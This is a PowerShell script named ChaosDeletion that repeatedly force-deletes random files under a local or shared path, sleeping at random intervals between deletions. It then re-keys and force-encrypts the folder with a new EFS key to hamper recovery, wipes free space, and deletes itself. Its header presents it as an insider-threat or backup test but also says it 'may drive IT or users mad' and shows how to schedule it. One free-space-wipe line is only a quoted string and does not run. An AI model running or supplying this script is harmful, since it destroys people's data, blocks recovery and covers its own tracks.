<#
ChaosDeletion v1.0 02/23/2017
dchow[AT]xtecsystems.com
www.xtecsystems.com
Recusrively selects a file from your input level directory and does the following:

1) Deletes the file
2) Wipes the free space in the folder specified
3) Generates new User (running the script) EFS key
4) Applies new EFS key to the original input folder
5) Sleeps at random timer
6) Starts up again and keeps doing it until return random file is null (no more left)
7) Script will Self-destruct

Why?
-Securely deletes random files from local or shares
-May drive IT or users mad
-Changes running user's EFS keys for the folder making it more annoying for data recovery of the folder
-A good test for detecting insider threat and file backups or snapshots
-If you're using this against 

Requirements:
Set-ExecutionPolicy bypass
User Permissions Required for Write Access

Parameters:
-path - The starting path that you want to recurse random file deletion AND EFS key swapping
-time - The max number of seconds the script will wait between deleting files

Usage: ChaosDeletion.ps1 -path \\hostname\fooShare$ -time 300
Use case 1: Run Locally or Setup with Task Scheduler as well

#>

#Commandline Parameters
Param([string]$path,[string]$time)

Do
{   
    #Get directory file object count
    [int]$fileCount = (Get-ChildItem $path -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count)

    #Grabbing random files
    [string]$randFileBase = (Get-ChildItem $path -Recurse -File | Select-Object -Expand FullName | Get-Random | `
    Out-String).trim()
    

    If ((Test-Path $randFileBase -IsValid) -eq $True)
    {
        Write-Host "Removing:" $randFileBase
        Remove-Item $randFileBase -Force

        Write-Host "Wiping marked free space:" $path
        "cipher.exe /W $path" | Select-String -SimpleMatch "Wiping marked free space"

    } 

    Write-Host "File Left is:" $fileCount -ForegroundColor Red -BackgroundColor Black

    [int]$sleepSec = (Get-Random -Maximum $time)
    Write-Host "Sleeping for:" $sleepSec "Seconds"
    Start-Sleep -Seconds $sleepSec
} 
While ($fileCount -gt 0)

#If there were any non-deletable files we can annoy and encrypt the path using EFS
#Also encrypts folder and updates the key (at least for local system)
#For remote systems you'll have to use invoke-command cmdlet with PowerShell
Write-Host "Generating new EFS key" -ForegroundColor Yellow -BackgroundColor Black
cipher.exe /k
Write-Host "Updating Target Folder with New EFS Key" -ForegroundColor Yellow -BackgroundColor Black
cipher.exe /u $path 
Write-Host "Forcing Encryption of $path with new key" -ForegroundColor Red -BackgroundColor Black
cipher.exe /e /f /a $path

#Self-Destruct Script Function After Completion
#Ref: https://www.safaribooksonline.com/library/view/windows-powershell-cookbook/9780596528492/ch14s05.html
Remove-Item $MyInvocation.InvocationName -ErrorAction SilentlyContinue
cipher.exe /w $path

#exit
 Exit
